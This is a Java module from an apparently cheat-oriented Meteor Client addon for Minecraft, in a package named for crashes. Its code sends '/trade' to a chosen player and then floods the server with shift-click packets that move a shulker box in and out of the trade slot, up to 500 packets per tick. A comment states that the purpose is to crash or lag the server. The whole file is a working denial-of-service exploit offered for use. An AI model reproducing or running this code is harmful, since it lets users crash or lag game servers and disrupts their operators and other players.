/*
 * This file is part of the Meteor Client distribution (https://github.com/MeteorDevelopment/meteor-client).
 * Copyright (c) Meteor Development.
 */

package io.jackywacky.addon.modules.crashes;

import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.game.OpenScreenEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.settings.StringSetting;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import meteordevelopment.meteorclient.utils.Utils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.gui.screen.DisconnectedScreen;
import net.minecraft.client.gui.screen.ingame.MerchantScreen;
import net.minecraft.screen.MerchantScreenHandler;
import net.minecraft.screen.slot.Slot;
import net.minecraft.screen.slot.SlotActionType;

import static meteordevelopment.meteorclient.MeteorClient.mc;
import io.jackywacky.addon.DupersUnitedPublicAddon;

/**
 * Runs /trade {username} then spams a shulker in and out of the trade GUI to crash/lag.
 */
public class TradeCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<String> username = sgGeneral.add(new StringSetting.Builder()
        .name("username")
        .description("Player to trade with. /trade will be run with this name.")
        .defaultValue("")
        .build()
    );

    private final Setting<Integer> packetsPerTick = sgGeneral.add(new IntSetting.Builder()
        .name("packets-per-tick")
        .description("Shift-click packets to send per tick (shulker to trade slot and back).")
        .defaultValue(50)
        .min(1)
        .max(500)
        .sliderRange(10, 200)
        .build()
    );

    private final Setting<Boolean> disableOnDisconnect = sgGeneral.add(new BoolSetting.Builder()
        .name("disable-on-disconnect")
        .description("Disables the module when disconnected from the server.")
        .defaultValue(true)
        .build()
    );

    /** First trade input slot id in MerchantScreenHandler (buy slot 1). */
    private static final int TRADE_INPUT_1_SLOT_ID = 1;

    private boolean tradeCommandSent = false;

    public TradeCrash() {
        super(DupersUnitedPublicAddon.CATEGORY_CRASHES, "trade-crash", "Runs /trade <username> then spams a shulker in and out of the trade window.");
    }

    @Override
    public void onActivate() {
        tradeCommandSent = false;
        String name = username.get();
        if (name == null || name.isBlank()) {
            error("Set a username first.");
            toggle();
            return;
        }
        ChatUtils.sendPlayerMsg("/trade " + name.trim());
        tradeCommandSent = true;
        info("Sent /trade %s – open the trade GUI to start.", name.trim());
    }

    @Override
    public void onDeactivate() {
        tradeCommandSent = false;
    }

    @EventHandler
    private void onScreenOpen(OpenScreenEvent event) {
        if (disableOnDisconnect.get() && event.screen instanceof DisconnectedScreen) {
            toggle();
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (disableOnDisconnect.get()) toggle();
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null || mc.getNetworkHandler() == null) return;
        if (!(mc.currentScreen instanceof MerchantScreen)) return;

        var handler = mc.player.currentScreenHandler;
        if (!(handler instanceof MerchantScreenHandler)) return;

        int shulkerSlotId = findShulkerSlotId(handler);
        if (shulkerSlotId < 0) {
            error("No shulker box in inventory. Put a shulker in your inventory and try again.");
            return;
        }

        int syncId = handler.syncId;
        for (int i = 0; i < packetsPerTick.get(); i++) {
            // Shift-click shulker into trade slot (QUICK_MOVE from player slot to trade)
            mc.interactionManager.clickSlot(syncId, shulkerSlotId, 0, SlotActionType.QUICK_MOVE, mc.player);
            // Shift-click from trade slot back to player
            mc.interactionManager.clickSlot(syncId, TRADE_INPUT_1_SLOT_ID, 0, SlotActionType.QUICK_MOVE, mc.player);
        }
    }

    /** Returns slot id of first slot containing a shulker box, or -1. */
    private int findShulkerSlotId(net.minecraft.screen.ScreenHandler handler) {
        for (Slot slot : handler.slots) {
            if (slot.getStack().isEmpty()) continue;
            if (Utils.isShulker(slot.getStack().getItem()))
                return slot.id;
        }
        return -1;
    }
}
